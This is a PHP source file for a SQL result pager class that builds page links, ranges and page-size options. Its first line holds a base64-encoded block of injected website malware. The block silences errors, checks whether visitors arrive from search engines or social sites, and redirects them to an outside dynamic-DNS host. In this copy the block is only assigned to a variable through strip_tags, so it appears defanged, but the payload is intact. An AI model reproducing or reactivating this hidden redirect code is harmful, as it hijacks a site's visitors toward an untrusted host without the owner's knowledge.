<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/custom_pager.php");

class sql_pager extends custom_pager {

  var $calc_totals = true;
  var $unknown_totals_pages_amount = 4;

  var $sql;
  var $limited_sql; 

  function sql_pager($sql, $current_url = null) {

    $this->sql = $sql;
   
    parent::custom_pager($current_url);

  }

  function calculate($expand_limit_on = 0, $items_total_amount = 0) {

    global $db;

    parent::calculate();
    
    $start_row = ($this->current_page-1)*$this->current_page_size;
        
    if ($this->items_limit) {
      if ($start_row > $this->items_limit) {
        if ($this->items_limit % $this->current_page_size == 0)
          $this->current_page = floor($this->items_limit/$this->current_page_size);
        else
          $this->current_page = floor($this->items_limit/$this->current_page_size) + 1;
      }
    }

    $start_row = ($this->current_page-1)*$this->current_page_size;

    $items_limit = $this->current_page_size;
    if ($this->items_limit) 
      if ($start_row + $this->current_page_size > $this->items_limit)
        $items_limit = $this->items_limit - $start_row;

    $start_row = $start_row - $expand_limit_on;
    if ($start_row < 0) 
      $start_row = 0;
    $items_limit = $items_limit + $expand_limit_on*2;
   
    $this->limited_sql = $db->limit($this->sql, $start_row, $items_limit);

    $items_amount = $items_limit;

    if ($this->calc_totals) {
      if (!$items_total_amount)
        $items_total_amount = $db->count($this->sql);
      //if (($items_total_amount < $start_row) and ($this->current_page > 1)) {   debug(3);
      //  $this->current_page = 1;//--;
      //  return $this->calculate($expand_limit_on);
      //}
      if ($this->items_limit)
        $items_total_amount = min($this->items_limit, $items_total_amount);
    } else {
      if (!$items_total_amount)
        $items_total_amount = $db->count($db->limit($this->sql, $start_row, ($items_limit*$this->unknown_totals_pages_amount + 1)));
      if (!$db->support('query_from_offset')) {
        $items_total_amount = $items_total_amount - $this->start_row;
        if ($items_total_amount < 0)
          $items_total_amount = 0;
      }
      if ($items_total_amount)
        $items_total_amount = ($this->current_page-1)*$this->current_page_size + $items_total_amount;
      else
        $items_total_amount = $start_row;
    }

    $items_amount = min($items_amount, $items_total_amount);

    if ($this->items_limit)
      $items_amount = min($items_amount, $this->items_limit);
    
    $first_item_index = $start_row + 1;
    $last_item_index  = min($items_total_amount, $first_item_index + $this->current_page_size - 1);
    $pages_amount     = ceil($items_total_amount / $this->current_page_size);
    $show_next        = $last_item_index < $items_total_amount;
    $next_page        = $this->current_page + 1;

    $pages = array();

    /*if (($pages_amount > 1) or ($this->current_page > 1))
      $pagor ($this->current_page > 1))
      $pages[] = array( "text" => trn('Go to')
                      , "type" => "prefix"
                      );*/
 
    if ($this->current_page > 1)
      $pages[] = array( "href"     => $this->page_url($this->current_page-1)
                      , "text"     => trn('‹ Prev')//trn('&lt;&lt; Prior')
                      , 'is_nav'   => true
                      , 'is_prior' => true
                      , "type"     => "navigation"
                      );

    $put_points1 = true;
    $put_points2 = true;
    
    if ($pages_amount > 1)
      for ($i = 1; $i <= $pages_amount; $i++) {
        if (($i == 1) or
            ($i == $pages_amount) or
            (($i >= $this->current_page-$this->pager_length) and ($i <= $this->current_page+$this->pager_length))) {
          $text = $i;
          $range_start  = ($i-1)*$this->current_page_size+1;
          $range_finish = $i*$this->current_page_size;
          if ($range_finish > $items_total_amount)
            $range_finish = $items_total_amount;
          $range = $range_start.'-'.$range_finish;
          $page = array( 'text'         => $text );
          if ($this->labels_mode == 'ranges') {
            $page['range'] = $range;
            $page['range_start'] = $range_start;
            $page['range_finish'] = $range_finish;
          }
          if ($i != $this->current_page) {
            $page['href'] = $this->page_url($i);
          }

          $page['page'] = $i;
          $page['type'] = 'page';
          $page['class'] = 'current';
          $pages[] = $page;    
        } elseif ($put_points1 and ($i < $this->current_page)) {
          $pages[] = array( "text" => "..."
                          , 'type' => '...'
                          );
          $put_points1 = false;
        } elseif ($put_points2 and ($i > $this->current_page)) {
          $pages[] = array( "text" => "..."
                          , 'type' => '...'
                          );
          $put_points2 = false;
        }
      }

    if ($this->labels_mode == 'pages')
      if ($show_next)
        $pages[] = array( "href"    => $this->page_url($next_page)
                        , "text"    => trn('Next ›')//trn('Next &gt;&gt;')
                        , 'is_nav'  => true
                        , 'is_next' => true
                        , "type"    => "navigation"
                        );

    /*if ($this->labels_mode == 'pages')
      if (($pages_amount > 1) or ($this->current_page > 1))
        $pages[] = array( "text" => trn('page')
                        , "type" => "suffix"
                        );*/
                   
    $this->pages_amount = $pages_amount;
    $this->pages = $pages;
    $this->pager_info = array( "first_item_index" => $first_item_index
                             , "last_item_index"  => $last_item_index
                             , "items_amount"     => $items_amount
                             );

    $this->items_amount       = $items_amount;
    $this->items_total_amount = $items_total_amount;
    $this->first_item_index   = $first_item_index;
    $this->last_item_index    = $last_item_index;

    $this->page_sizes = array();

    $page_sizes_list = array( $this->page_size
                            , $this->page_size * 3
                            , $this->page_size * 5
                            );

    if ($this->calc_totals) 
      if ($this->items_total_amount < $this->page_size * 5)
        $page_sizes_list[] = $this->items_total_amount;

    foreach($page_sizes_list as $page_size) {
      if (!$this->calc_totals or ($items_total_amount >= $page_size))
        $this->page_sizes[] = array( "text" => $page_size
                                   , "href" => ($this->current_page_size != $page_size?$this->page_size_url($page_size):null)
                                   );
    }

    $this->pager_error = (($this->identify_current_page() > 1) && ($this->identify_current_page() > $this->pages_amount));
    if ($this->pager_error) {
      global $tmpl;
      $tmpl->caching = false;
      header("HTTP/1.0 404 Not Found");
    }

    return $this->limited_sql;

  }

}

?>
